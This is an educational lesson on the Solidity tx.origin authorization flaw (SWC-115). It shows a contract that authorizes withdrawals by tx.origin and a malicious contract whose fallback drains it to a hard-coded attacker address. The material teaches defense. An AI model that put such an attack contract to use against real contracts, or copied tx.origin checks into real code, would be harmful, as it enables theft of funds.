TxOrigin Attack (SWC-115)
-------------------------

In this lesson we are going to cover a `tx.origin` attack. The global variable `tx.origin` in Solidity always references the address of the original sender of the transaction, of the full call chain. [See the reference in the docs here.](https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=tx.origin#block-and-transaction-properties){target=_blank} This is different than `msg.sender` in that `msg.sender` references the address of the sender of the current call.

You should never use `tx.origin` in Solidity for authorization ([SWC-115](https://swcregistry.io/docs/SWC-115){target=_blank}). The following smart contract shows you why. It is susceptible to attack.

```
pragma solidity >0.5.0;  

// Example Tx.Origin Authentication Attack     
contract VulnerableContract {      
  address payable owner = msg.sender;             
  
  function withdraw(address payable _recipient) public {          
    require(tx.origin == owner);          
    _recipient.transfer(address(this).balance);      
  }             
  
  function getBalance() view public returns(uint) {          
    return address(this).balance;      
  }             
  
  function() external payable {}  
}     

contract MaliciousContract {      
  VulnerableContract vulnerableContract = VulnerableContract(0x08970FEd061E7747CD9a38d680A601510CB659FB);      
  address payable attackerAddress = 0xdD870fA1b7C4700F2BD7f44238821C26f7392148;             
  
  function() external payable {          
    vulnerableContract.withdraw(attackerAddress);      
  }  
}
```

In this contract, if the creator of the VulnerableContract is tricked into calling the MaliciousContract, the Malicious contract will be able to drain the VulnerableContract of all funds.

Additional Resources:

* [Solidity documentation on the security considerations of tx.origin](https://solidity.readthedocs.io/en/latest/security-considerations.html?#tx-origin){target=_blank}
* [The SWC Registry entry for Authorization through tx.origin](https://swcregistry.io/docs/SWC-115){target=_blank}
